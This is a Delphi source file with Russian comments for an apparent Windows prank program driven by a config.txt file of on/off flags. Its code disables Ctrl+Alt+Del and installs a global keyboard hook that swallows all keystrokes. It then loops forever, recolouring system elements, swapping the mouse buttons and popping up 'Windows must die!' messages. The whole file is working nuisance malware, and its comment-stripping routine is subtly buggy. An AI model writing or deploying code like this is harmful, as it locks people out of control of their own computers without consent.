program Project2;


uses
  Windows;

const
SysColorArray: array [0..13] of Integer = (COLOR_ACTIVEBORDER, COLOR_ACTIVECAPTION, COLOR_APPWORKSPACE, COLOR_BACKGROUND, COLOR_BTNFACE, COLOR_BTNTEXT, COLOR_CAPTIONTEXT, COLOR_INACTIVEBORDER, COLOR_INFOTEXT, COLOR_MENU, COLOR_MENUTEXT, COLOR_WINDOW, COLOR_WINDOWFRAME, COLOR_WINDOWTEXT);
ColorArray: array [0..12] of Integer = (16776960, 0, 16711680, 65535, 16711935, 32768, 8388608, 255, 12632256, 16777215, 15780518, 128, 32896);
//Цвета хранятся в модуле Graphics.pas, 
//но мы не будем использовать его,
//а запишем цвета в цифровом виде.

var
F: TextFile; //наш файл с настройками
S: ShortString;
i: Smallint;
h: hwnd;
JokeType: Array[1..10] of Boolean; //наш массив

var
Dummy     : integer=0;
OldKbHook : HHook=0;
// отключение клавиатуры
function KbHook( code: Integer; wparam: Word; lparam: LongInt ): LongInt; stdcall;
begin
if code<0 then Result:=CallNextHookEx( oldKbHook, code, wparam, lparam )
else Result:=1;
end;


function CheckLine(Line: ShortString): Boolean;
var
n1,n2: Smallint;
begin
//удаляем из строки комментарии
Result:=false;
n1:=pos('{',Line);
n2:=pos('}',Line);
delete(Line, n1, n2);
if Line='1' then result:=true;
end;

begin
AssignFile(F, 'config.txt'); //соединяемся с файлом
Reset(F); //перемещаемся в начало файла
for i:=1 to 10 do begin //читаем все строки
ReadLn(F, s);
JokeType[i]:=CheckLine(S);
end;
CloseFile(f); //отсоединяемся
//начинаем шутить :)
Randomize;
if JokeType[1] then //отключаем Ctrl+Alt+Del
SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, 0, 0);
// Отключаем клавиатуру
if JokeType[2] then begin
SystemParametersInfo( SPI_SETFASTTASKSWITCH, 1, @Dummy, 0);
SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @Dummy, 0);
OldKbHook := SetWindowsHookEx( WH_KEYBOARD, @KbHook, HInstance, 0 );
end;
//запускаем бесконечный цикл:
while true do begin
Sleep(10000); //ждем 10 секунд
//меняем системные цвета:
if JokeType[3] then
SetSysColors(1, SysColorArray[random(13)], ColorArray[random(12)]);
//меняем кнопки мыши местами
if JokeType[4] then begin
SwapMouseButton(true);
Sleep(3000);
SwapMouseButton(false);
end;
if JokeType[5] then MessageBox(h,'Windows must die!','Error',0);
if JokeType[6] then Halt; //выключаемся
end;
end.
